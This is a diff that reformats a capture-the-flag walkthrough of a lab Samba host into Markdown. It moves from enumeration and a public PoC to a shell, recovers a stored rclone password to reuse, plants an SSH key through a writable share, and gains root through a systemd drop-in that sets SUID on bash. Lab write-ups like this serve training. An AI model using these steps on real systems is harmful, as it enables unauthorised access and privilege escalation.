@@ -1,5 +1,6 @@
-
-└─$ nmap -p- -sSCV 10.129.244.177 --min-rate 999 
+#### Enumeration
+`└─$ nmap -p- -sSCV 10.129.244.177 --min-rate 999 `
+```
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -7,9 +8,10 @@ PORT    STATE SERVICE     VERSION
 |_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
 139/tcp open  netbios-ssn Samba smbd 4
 445/tcp open  netbios-ssn Samba smbd 4
-
-
-└─$ netexec smb 10.129.244.177 -u guest -p '' --shares
+```
+For smb
+`└─$ netexec smb 10.129.244.177 -u guest -p '' --shares`
+```
 SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False)
 SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\guest: (Guest)
 SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
@@ -19,12 +21,17 @@ SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE       
 SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
 SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
 SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
+```
+we notice a HP rinter service in running on this host.
 
 https://github.com/TheCyberGeek/CVE-2026-4480-PoC
 
+use this vunl PoC, we get a shell with nobody.
+find any conf file, with /usr and /etc
 
-
-nobody@abducted:/var/spool/samba$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
+#### foot hold
+`nobody@abducted:/var/spool/samba$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"`
+```
 <ame "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
 /var/lib/ucf/cache/:etc:samba:smb.conf
 /var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
@@ -32,9 +39,10 @@ nobody@abducted:/var/spool/samba$ find / -type f -name "*.conf" 2>/dev/null | gr
 /run/tmpfiles.d/static-nodes.conf
 /run/systemd/resolve/resolv.conf
 /run/systemd/resolve/stub-resolv.conf
+```
 
-
-nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
+`nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf`
+```
 cat /opt/offsite-backup/rclone.conf
 [offsite]
 type = sftp
@@ -42,29 +50,41 @@ host = backup.hartley-group.internal
 user = svc-backup
 pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
 shell_type = unix
+```
+it is a string encode by reclone, we can review it
 
-nobody@abducted:/var/spool/samba$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
-<clone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+`nobody@abducted:/var/spool/samba$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw`
+```<clone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
 iXzvcib3SrpZ
+```
 
-nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep bash
+
+`nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep bash`
+```
 cat /etc/passwd | grep bash
 root:x:0:0:root:/root:/bin/bash
 scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
 marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
-
+```
+su scott
+```
 scott@abducted:~$ id
 uid=1000(scott) gid=1001(scott) groups=1001(scott)
+```
+find conf filke again
 
-scott@abducted:/var/log/sysstat$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
+`scott@abducted:/var/log/sysstat$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"`
+```
 /var/lib/ucf/cache/:etc:samba:smb.conf
 /var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
 /opt/offsite-backup/rclone.conf
 /run/tmpfiles.d/static-nodes.conf
 /run/systemd/resolve/resolv.conf
 /run/systemd/resolve/stub-resolv.conf
+```
 
-scott@abducted:/var/log/sysstat$ ls -la /etc/samba/smb.conf
+`scott@abducted:/var/log/sysstat$ ls -la /etc/samba/smb.conf`
+```
 -rw-r--r-- 1 root root 361 Apr 22  2025 /etc/samba/smb.conf
 scott@abducted:/var/log/sysstat$ cat /etc/samba/smb.conf
 [global]
@@ -81,8 +101,10 @@ scott@abducted:/var/log/sysstat$ cat /etc/samba/smb.conf
    allow insecure wide links = yes
    log level = 0
    include = /etc/samba/shares.conf
+```
 
-scott@abducted:/var/log/sysstat$ cat /etc/samba/shares.conf
+`scott@abducted:/var/log/sysstat$ cat /etc/samba/shares.conf`
+```
 [HP-Reception]
    comment = Reception printer
    path = /var/spool/samba
@@ -107,16 +129,20 @@ scott@abducted:/var/log/sysstat$ cat /etc/samba/shares.conf
    read only = no
    wide links = yes
    browseable = yes
-
-scott@abducted:/var/log/sysstat$ ls -la /srv
+```
+check the privi if this path,
+`scott@abducted:/var/log/sysstat$ ls -la /srv`
+```
 total 16
 drwxr-xr-x  4 root  root  4096 Mar 31  2025 .
 drwxr-xr-x 23 root  root  4096 Jun  4 13:41 ..
 drwxr-x---  2 scott scott 4096 Oct  9  2025 projects
 drwxr-xr-x  2 scott scott 4096 Oct  9  2025 transfer
+```
+since itis smb shares, also check the privi of scott, if we can put files
 
-
-└─$ netexec smb 10.129.244.177 -u scott -p iXzvcib3SrpZ --shares
+`└─$ netexec smb 10.129.244.177 -u scott -p iXzvcib3SrpZ --shares`
+```
 SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False)
 SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\scott:iXzvcib3SrpZ 
 SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
@@ -126,9 +152,13 @@ SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE       
 SMB         10.129.244.177  445    ABDUCTED         projects        READ,WRITE      Hartley Group Project Files
 SMB         10.129.244.177  445    ABDUCTED         transfer        READ            Staff file transfer
 SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
-                              
+```
+we can write to projects. try toi put pub key to marcus
+							  
+#### lateral move
 
-└─$ ssh-keygen -t rsa                                            
+`└─$ ssh-keygen -t rsa `
+```
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/ed/.ssh/id_rsa): /tmp/id
 Enter passphrase for "/tmp/id" (empty for no passphrase): 
@@ -149,8 +179,10 @@ The key's randomart image is:
 |           . .o.+|
 |              ...|
 +----[SHA256]-----+
+```
 
-─$ smbclient //10.129.244.177/transfer   -U 'scott%iXzvcib3SrpZ'
+`─$ smbclient //10.129.244.177/transfer   -U 'scott%iXzvcib3SrpZ'`
+```
 Try "help" to get a list of possible commands.
 smb: \> cd marcus\
 smb: \marcus\> ls
@@ -171,27 +203,41 @@ smb: \marcus\.ssh\> ls
   .                                   D        0  Sat Jul 18 08:58:47 2026
   ..                                  D        0  Sat Jul 18 08:57:48 2026
   authorized_keys                     A      561  Sat Jul 18 08:58:47 2026
+```
+#### Privi Escalate 
 
-
-
+ssh login marcus
+```
 marcus@abducted:~$ id
 uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
+```
+systemd Drop-in (operators group)
+systemd service drop-ins allow adding or overriding directives in a service unit without modifying the original file. 
 
-marcus@abducted:~$ find / -group operators 2>/dev/null
+`marcus@abducted:~$ find / -group operators 2>/dev/null`
+```
 /etc/systemd/system/smbd.service.d
+```
+so we add bash command in ExecStartPre of service, so that a service start to run, the command will be executed first.
 
-
-marcus@abducted:/etc/systemd/system/smbd.service.d$ cat exp.conf 
+`marcus@abducted:/etc/systemd/system/smbd.service.d$ cat exp.conf `
+```
 [Service]
 ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
-
-
+```
+```
 marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
 marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
-
-
+```
+we set suid to bash
+```
 scott@abducted:/var/log/sysstat$ ls -la /bin/bash
 -rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
 scott@abducted:/var/log/sysstat$ bash -p
 bash-5.2# id
 uid=1000(scott) gid=1001(scott) euid=0(root) egid=0(root) groups=0(root),1001(scott)
+```
+
+#### lesson learned
+- find conf file
+- service modify with Dropin privi of operation group.
